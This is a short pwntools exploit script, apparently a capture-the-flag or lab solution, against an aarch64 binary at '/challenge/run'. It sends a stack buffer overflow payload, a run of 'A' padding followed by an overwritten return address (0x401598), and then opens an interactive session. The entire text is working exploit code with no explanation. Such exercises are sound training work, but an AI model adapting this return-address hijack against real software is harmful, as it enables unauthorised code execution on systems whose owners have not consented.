from pwn import *
context.arch="aarch64"

p = process("/challenge/run")
exp= b"A"*(0x8A+8) + 0x401598.to_bytes(8, "little")

p.send(exp)

p.interactive()